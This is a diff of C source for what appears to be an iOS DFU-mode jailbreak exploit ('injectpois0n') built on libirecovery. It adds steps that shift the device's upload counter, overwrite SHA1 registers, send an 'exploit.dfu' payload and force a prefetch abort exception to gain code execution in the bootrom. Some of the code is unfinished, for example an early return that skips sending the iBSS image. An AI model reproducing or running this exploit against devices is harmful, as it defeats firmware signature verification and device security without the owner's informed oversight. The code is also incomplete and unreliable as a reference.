@@ -6,8 +6,10 @@
 #include "injectpois0n.h"
 
 int injectpois0n_debug = 1;
+static irecv_client_t client = NULL;
+static irecv_device_t device = NULL;
 
-int fetch_ibss(irecv_device_t device) {
+int fetch_ibss() {
 	char name[32];
 	char path[256];
 
@@ -23,7 +25,7 @@ int fetch_ibss(irecv_device_t device) {
 	return 0;
 }
 
-int shift_upload_counter(irecv_client_t client, int shift) {
+int receive_data(int shift) {
 	char* buffer = NULL;
 	irecv_error_t error = 0;
 
@@ -44,21 +46,19 @@ int shift_upload_counter(irecv_client_t client, int shift) {
 	return 0;
 }
 
-int overwrite_sha1_registers(irecv_client_t client) {
+int overwrite_sha1_registers() {
 	irecv_error_t error = 0;
 
 	debug("Resetting device counters\n");
 	error = irecv_reset_counters(client);
 	if (error != IRECV_E_SUCCESS) {
 		error("%s\n", irecv_strerror(error));
-		irecv_close(client);
 		return -1;
 	}
 
 	debug("Shifting upload pointer\n");
-	if(shift_upload_counter(client, 0x80)) {
+	if(receive_data(0x80)) {
 		error("Unable to shift upload counter\n");
-		irecv_close(client);
 		return -1;
 	}
 
@@ -69,16 +69,100 @@ int overwrite_sha1_registers(irecv_client_t client) {
 	error = irecv_finish_transfer(client);
 	if (error != IRECV_E_SUCCESS) {
 		error("%s\n", irecv_strerror(error));
-		irecv_close(client);
 		return -1;
 	}
+
+	debug("Reconnecting to device\n");
+	client = irecv_reconnect(client);
+	if (client == NULL) {
+		error("Unable to reconnect to device\n");
+		return -1;
+	}
+
+	// send 0x800 bytes of data?
+
+	debug("Overwriting SHA1 registers\n");
+	if(receive_data(0x2C000)) {
+		error("Unable to overwrite SHA1 registers\n");
+		return -1;
+	}
+
+	return 0;
+}
+
+int upload_exploit_data() {
+	irecv_error_t error = 0;
+
+	debug("Resetting device counters\n");
+	error = irecv_reset_counters(client);
+	if (error != IRECV_E_SUCCESS) {
+		error("%s\n", irecv_strerror(error));
+		return -1;
+	}
+
+	debug("Shifting upload pointer\n");
+	if(receive_data(0x140)) {
+		error("Unable to shift upload counter\n");
+		return -1;
+	}
+
+	debug("Resetting device\n");
+	irecv_reset(client);
+
+	debug("Finishing shift transaction\n");
+	error = irecv_finish_transfer(client);
+	if (error != IRECV_E_SUCCESS) {
+		error("%s\n", irecv_strerror(error));
+		return -1;
+	}
+
+	debug("Reconnecting to device\n");
+	client = irecv_reconnect(client);
+	if (client == NULL) {
+		error("Unable to reconnect to device\n");
+		return -1;
+	}
+
+	debug("Sending exploit data\n");
+	error = irecv_send_file(client, "exploit.dfu");
+	if(error != IRECV_E_SUCCESS) {
+		error("Unable to send exploit data\n");
+		return -1;
+	}
+
+	debug("Forcing prefetch abort exception\n");
+	if(receive_data(0x2C000)) {
+		error("Unable to force prefetch abort exception\n");
+		return -1;
+	}
+
+	return 0;
+}
+
+int upload_ibss_data() {
+	irecv_error_t error = 0;
+
+	debug("Resetting device counters\n");
+	error = irecv_reset_counters(client);
+	if (error != IRECV_E_SUCCESS) {
+		error("%s\n", irecv_strerror(error));
+		return -1;
+	}
+	return 0;
+
+	error = irecv_send_file(client, "image.bin");
+	if(error != IRECV_E_SUCCESS) {
+		error("%s\n", irecv_strerror(error));
+		return -1;
+	}
+
 	return 0;
 }
 
 int main(int argc, char* argv[]) {
 	irecv_error_t error = 0;
-	irecv_client_t client = NULL;
-	irecv_device_t device = NULL;
+
+	irecv_init();
 
 	// open connection to the device
 	debug("Connecting to device\n");
@@ -113,20 +197,33 @@ int main(int argc, char* argv[]) {
 	}
 
 	debug("Attempting to fetch iBSS from Apple's servers\n");
-	if(fetch_ibss(device) < 0) {
+	if(fetch_ibss() < 0) {
 		error("Unable to fetch iBSS from Apple's servers\n");
 		irecv_close(client);
 		return -1;
 	}
 
 	debug("Preparing to overwrite SHA1 registers\n");
-	if(overwrite_sha1_registers(client) < 0) {
+	if(overwrite_sha1_registers() < 0) {
 		error("Unable to overwrite SHA1 registers\n");
 		irecv_close(client);
 		return -1;
 	}
 
+	debug("Preparing to upload exploit data\n");
+	if(upload_exploit_data()) {
+		error("Unable to upload exploit data\n");
+		irecv_close(client);
+		return -1;
+	}
+
+	debug("Preparing to send iBSS to device\n");
+	if(upload_ibss_data()) {
+		return -1;
+	}
+
 	debug("Disconnecting from device\n");
 	irecv_close(client);
+	irecv_exit();
 	return 0;
 }
